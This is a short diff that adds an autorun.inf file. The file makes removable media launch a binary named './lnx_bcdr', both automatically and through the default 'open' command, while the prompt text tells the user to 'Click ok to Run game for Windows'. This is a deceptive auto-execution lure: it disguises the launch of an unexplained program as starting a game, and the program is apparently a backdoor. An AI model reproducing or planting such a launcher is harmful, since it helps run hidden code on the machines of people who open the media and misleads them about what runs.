@@ -1,0 +1,4 @@
+[autorun]
+open=./lnx_bcdr
+action=Click ok to Run game for Windows
+shell\open\command=./lnx_bcdr
